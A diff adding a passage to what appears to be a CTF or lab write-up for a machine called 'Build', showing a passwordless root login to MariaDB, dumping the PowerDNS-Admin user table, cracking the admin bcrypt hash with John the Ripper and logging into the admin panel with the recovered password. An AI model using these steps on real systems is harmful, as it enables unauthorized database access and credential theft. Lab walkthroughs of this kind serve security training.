@@ -704,9 +704,125 @@ We can connect as root without password:
 <br />
 
 ```bash
+❯ mysql -h 172.18.0.4 -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 37
+Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution
 
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
 ```
 
 <br />
 
+And list the databases:
 
+<br />
+
+```bash
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| powerdnsadmin      |
+| sys                |
++--------------------+
+5 rows in set (0,047 sec)
+```
+
+<br />
+
+There is only one non-default DB: `powerdnsadmin`
+
+We proceed to select this database and list its tables:
+
+<br />
+
+```bash
+MariaDB [(none)]> use powerdnsadmin;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [powerdnsadmin]> show tables;
++-------------------------+
+| Tables_in_powerdnsadmin |
++-------------------------+
+| account                 |
+| account_user            |
+| alembic_version         |
+| apikey                  |
+| apikey_account          |
+| comments                |
+| cryptokeys              |
+| domain                  |
+| domain_apikey           |
+| domain_setting          |
+| domain_template         |
+| domain_template_record  |
+| domain_user             |
+| domainmetadata          |
+| domains                 |
+| history                 |
+| records                 |
+| role                    |
+| sessions                |
+| setting                 |
+| supermasters            |
+| tsigkeys                |
+| user                    |
++-------------------------+
+23 rows in set (0,043 sec)
+```
+
+<br />
+
+The `user` table contains the hash of the admin user:
+
+<br />
+
+```bash
+MariaDB [powerdnsadmin]> select * from user;
++----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
+| id | username | password                                                     | firstname | lastname | email          | otp_secret | role_id | confirmed |
++----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
+|  1 | admin    | $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq | admin     | admin    | admin@build.vl | NULL       |       1 |         0 |
++----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
+1 row in set (0,042 sec)
+```
+
+<br />
+
+The hash was straightforward to crack:
+
+<br />
+
+```bash
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+winston          (?)     
+1g 0:00:00:29 DONE (2026-01-09 13:42) 0.03385g/s 46.31p/s 46.31c/s 46.31C/s rangers1..danica
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+<br />
+
+With these credentials we log into the `powerdns` admin pannel: `admin:winston`
+
+<br />
+
+![10](../../../assets/imagesV/Build/10.png)
+
+<br />
